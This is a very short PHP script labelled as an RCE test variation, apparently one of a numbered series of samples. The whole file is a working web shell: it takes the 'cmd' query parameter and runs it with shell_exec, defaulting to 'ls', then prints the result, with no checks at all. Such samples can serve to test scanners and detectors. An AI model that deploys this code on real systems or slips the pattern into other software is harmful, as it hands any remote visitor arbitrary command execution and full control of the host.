<?php
// RCE test variation #780
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>